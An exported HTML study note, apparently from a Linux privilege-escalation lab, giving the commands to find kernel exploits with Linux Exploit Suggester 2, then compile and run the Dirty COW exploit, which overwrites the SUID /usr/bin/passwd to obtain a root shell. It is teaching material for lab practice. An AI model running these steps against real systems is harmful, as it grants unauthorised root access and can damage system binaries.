<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Kernel Exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Kernel Exploits</h1><br/><strong><h1>Kernel Exploits</h1></strong><br /><br /><br /><br />Kernel exploits can leave the system in an <strong>unstable</strong> state, which is why you should only run them as a <strong>last resort</strong>.<br /><br />Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:<br /><br /><strong>perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</strong><br /><br />The popular Linux kernel exploit &quot;<strong>Dirty COW</strong>&quot; should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the <strong>SUID</strong> file <strong>/usr/bin/passwd</strong> with one that <strong>spawns</strong> a <strong>shell</strong> (a <strong>backup</strong> of <strong>/usr/bin/passwd</strong> is made at <strong>/tmp/bak</strong>).<br /><br />Compile the code and run it (note that it may take several minutes to complete):<br /><br /><strong>gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w</strong><br /><strong>./c0w</strong><br /><br />Once the exploit completes, run /usr/bin/passwd to gain a root shell:<br /><br /><strong>/usr/bin/passwd</strong><br /><br />Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!<br /><br /><strong>mv /tmp/bak /usr/bin/passwd<br />exit</strong><br /><br /><br /><br /><strong><h2>END</h2></strong><br /><br /></div>
</body>
</html>
